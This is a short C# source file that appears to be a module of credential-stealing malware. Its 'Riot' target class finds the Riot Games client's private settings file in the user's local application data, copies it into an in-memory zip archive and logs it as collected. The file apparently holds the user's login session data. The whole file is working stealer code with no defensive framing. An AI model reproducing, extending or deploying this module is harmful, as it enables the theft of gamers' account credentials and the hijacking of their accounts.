using Helper.Data;
using System;
using System.IO;

namespace Targets.Games
{
	public class Riot : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Riot Games", "Riot Client", "Data", "RiotGamesPrivateSettings.yaml");
	    if (!File.Exists(path))
	      return;
	    string entryPath = Path.Combine(nameof (Riot), "RiotGamesPrivateSettings.yaml");
	    zip.AddFile(entryPath, File.ReadAllBytes(path));
	    counter.Games.Add(new Counter.CounterApplications()
	    {
	      Name = nameof (Riot),
	      Files = {
	        $"{path} => {entryPath}"
	      }
	    });
	  }
	}
}
